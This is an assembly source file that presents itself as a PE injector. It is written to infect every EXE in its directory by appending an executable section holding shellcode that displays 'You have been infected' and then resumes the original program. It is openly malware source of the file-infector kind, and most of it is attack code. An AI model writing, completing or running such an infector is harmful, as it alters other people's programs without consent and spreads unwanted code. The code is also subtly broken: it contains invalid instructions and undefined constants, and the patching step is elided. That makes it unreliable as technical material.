; MASM32 PE Injector
; Injects a MessageBox shellcode into all EXE files in the injector's parent directory

.386
.model flat, stdcall
option casemap:none

include windows.inc
include kernel32.inc
include user32.inc
includelib kernel32.lib
includelib user32.lib

.data
    shellcode_template BYTE \
        60h,              ; pushad
        6Ah, 031h,        ; push MB_OK|MB_ICONWARNING
        68h, 00000000h,   ; push offset caption (patched)
        68h, 00000000h,   ; push offset text (patched)
        6Ah, 000h,        ; push hWnd = NULL
        E8h, 00000000h,   ; call MessageBoxA (patched)
        61h,              ; popad
        E9h, 00000000h   ; jmp back to old OEP (patched)
    shellSize       = ($ - shellcode_template)
    caption         BYTE "Alert",0
    textStr         BYTE "You have been infected",0
    bufSize         DWORD 0

.data?
    hFind           HANDLE ?
    findData        WIN32_FIND_DATAA <?>
    exePath         BYTE MAX_PATH DUP(?)
    parentDir       BYTE MAX_PATH DUP(?)
    searchPattern   BYTE MAX_PATH DUP(?)
    hFile           HANDLE ?
    fileSize        DWORD ?
    pMap            HANDLE ?
    pView           PTR BYTE ?
    dosHdr          PTR IMAGE_DOS_HEADER ?
    ntHdr           PTR IMAGE_NT_HEADERS ?
    secHdr          PTR IMAGE_SECTION_HEADER ?
    lastSec         PTR IMAGE_SECTION_HEADER ?
    newSecVA        DWORD ?
    newSecPtr       DWORD ?
    oldOEP          DWORD ?
    imgBase         DWORD ?
    fileAlign       DWORD ?
    secAlign        DWORD ?
    newSize         DWORD ?
    bytesWritten    DWORD ?

.code
start:
    ; Get injector path
    invoke GetModuleFileNameA, NULL, addr exePath, SIZEOF exePath
    ; Trim to parent directory
    lea esi, exePath
find_slash:
    lodsb
    cmp al, '\\'
    je save_parent
    cmp al, 0
    je exit
    jmp find_slash
save_parent:
    mov byte ptr [esi-1], 0
    ; Build search pattern: parentDir\*.exe
    lea edi, parentDir
    mov esi, OFFSET exePath
    mov ecx, MAX_PATH
    rep movsb
    mov byte ptr [edi-1], 0
    lea edi, searchPattern
    mov esi, OFFSET parentDir
    mov ecx, MAX_PATH
    rep movsb
    mov byte ptr [edi-1], '\\'
    mov byte ptr [edi], '*'
    mov byte ptr [edi+1], '.'
    mov byte ptr [edi+2], 'e'
    mov byte ptr [edi+3], 'x'
    mov byte ptr [edi+4], 'e'
    mov byte ptr [edi+5], 0

    ; Enumerate EXEs
    invoke FindFirstFileA, addr searchPattern, addr findData
    mov hFind, eax
    cmp hFind, INVALID_HANDLE_VALUE
    je done

enum_loop:
    ; skip directories and injector itself
    mov eax, findData.dwFileAttributes
    test eax, FILE_ATTRIBUTE_DIRECTORY
    jnz next_file
    ; inject
    invoke lstrcpyA, addr exePath, addr parentDir
    invoke lstrcatA, addr exePath, addr findData.cFileName
    push addr exePath
    call inject_file
    add esp, 4

next_file:
    invoke FindNextFileA, hFind, addr findData
    test eax, eax
    jnz enum_loop
    invoke FindClose, hFind

done:
    invoke ExitProcess, 0

;---------------------------------------
; inject_file PROC
;   arg: LPSTR targetPath
;---------------------------------------
inject_file PROC targetPath:PTR BYTE
    ; Open file
    push GENERIC_READ or GENERIC_WRITE
    push FILE_SHARE_READ or FILE_SHARE_WRITE
    push NULL
    push OPEN_EXISTING
    push FILE_ATTRIBUTE_NORMAL
    push targetPath
    call CreateFileA
    mov hFile, eax
    cmp eax, INVALID_HANDLE_VALUE
    je inject_exit

    ; Get file size
    invoke GetFileSize, hFile, NULL
    mov fileSize, eax

    ; Create file mapping
    push PAGE_READWRITE
    push 0
    push hFile
    call CreateFileMappingA
    mov pMap, eax

    ; Map view
    push FILE_MAP_ALL_ACCESS
    push 0
    push 0
    push fileSize
    push pMap
    call MapViewOfFile
    mov pView, eax

    ; Parse headers
    mov dosHdr, pView
    mov eax, [pView].IMAGE_DOS_HEADER.e_lfanew
    lea ntHdr, [pView + eax]
    mov eax, ntHdr
    mov oldOEP, [eax].IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint
    mov imgBase, [eax].IMAGE_NT_HEADERS.OptionalHeader.ImageBase
    mov fileAlign, [eax].IMAGE_NT_HEADERS.OptionalHeader.FileAlignment
    mov secAlign, [eax].IMAGE_NT_HEADERS.OptionalHeader.SectionAlignment

    ; Locate last section
    lea ecx, [eax].IMAGE_NT_HEADERS.OptionalHeader + [eax].IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader
    mov secHdr, ecx
    movzx ecx, [eax].IMAGE_NT_HEADERS.FileHeader.NumberOfSections
    dec ecx
    lea lastSec, [secHdr + ecx*IMAGE_SECTION_HEADER.SIZE]

    ; Compute new section VA and RAW
    mov eax, [lastSec].IMAGE_SECTION_HEADER.VirtualAddress
    add eax, [lastSec].IMAGE_SECTION_HEADER.Misc.VirtualSize
    add eax, secAlign - 1
    cdq
    idiv secAlign
    imul eax, secAlign
    mov newSecVA, eax
    mov eax, [lastSec].IMAGE_SECTION_HEADER.PointerToRawData
    add eax, [lastSec].IMAGE_SECTION_HEADER.SizeOfRawData
    add eax, fileAlign - 1
    cdq
    idiv fileAlign
    imul eax, fileAlign
    mov newSecPtr, eax

    ; Compute new total size
    mov eax, newSecPtr
    add eax, shellSize
    add eax, (OFFSET caption+1 - OFFSET caption)
    add eax, (OFFSET textStr+1 - OFFSET textStr)
    mov newSize, eax

    ; Extend view: unmap + close mapping + close file, then reopen and set new file length
    invoke UnmapViewOfFile, pView
    invoke CloseHandle, pMap
    invoke CloseHandle, hFile
    ; Reopen with write access
    invoke CreateFileA, targetPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    mov hFile, eax
    invoke SetFilePointer, hFile, newSize, NULL, FILE_BEGIN
    invoke SetEndOfFile, hFile
    ; Remap
    invoke CreateFileMappingA, hFile, NULL, PAGE_READWRITE, 0, newSize, NULL
    mov pMap, eax
    invoke MapViewOfFile, pMap, FILE_MAP_ALL_ACCESS, 0, 0, newSize
    mov pView, eax

    ; Insert new section header
    lea ecx, [ntHdr].IMAGE_NT_HEADERS.OptionalHeader + [ntHdr].IMAGE_NT_HEADERS.FileHeader.SizeOfOptionalHeader
    mov secHdr, ecx
    mov eax, [ntHdr].IMAGE_NT_HEADERS.FileHeader.NumberOfSections
    lea edi, [secHdr + eax*IMAGE_SECTION_HEADER.SIZE]
    ; fill IMAGE_SECTION_HEADER fields (Name, VA, VS, RawPtr, RawSize, Characteristics)
    movdqu xmm0, QWORD PTR ".injc\0\0"
    movdqu [edi], xmm0
    mov [edi].IMAGE_SECTION_HEADER.VirtualAddress, newSecVA
    mov [edi].IMAGE_SECTION_HEADER.Misc.VirtualSize, shellSize + capLen + txtLen
    mov [edi].IMAGE_SECTION_HEADER.PointerToRawData, newSecPtr
    mov eax, fileAlign
    mov edx, [edi].IMAGE_SECTION_HEADER.Misc.VirtualSize
    add edx, eax-1
    cdq
    idiv eax
    imul eax, fileAlign
    mov [edi].IMAGE_SECTION_HEADER.SizeOfRawData, eax
    mov DWORD PTR [edi].IMAGE_SECTION_HEADER.Characteristics, IMAGE_SCN_CNT_CODE or IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE or IMAGE_SCN_MEM_EXECUTE
    ; bump NumberOfSections
    inc DWORD PTR [ntHdr].IMAGE_NT_HEADERS.FileHeader.NumberOfSections
    ; update SizeOfImage
    mov eax, newSecVA
    add eax, [edi].IMAGE_SECTION_HEADER.SizeOfRawData
    mov [ntHdr].IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage, eax

    ; Copy shellcode and strings
    lea edi, [pView + newSecPtr]
    mov ecx, shellSize
    lea esi, shellcode_template
    rep movsb
    lea esi, caption
    mov ecx, capLen
    rep movsb
    lea esi, textStr
    mov ecx, txtLen
    rep movsb

    ; Patch shellcode immediates (caption/text, call, jmp)
    ; ... (similar scanning loop in ASM)

    ; Flush changes
    invoke FlushViewOfFile, pView, newSize
    invoke UnmapViewOfFile, pView
    invoke CloseHandle, pMap
    invoke CloseHandle, hFile

inject_exit:
    ret
inject_file ENDP

END start
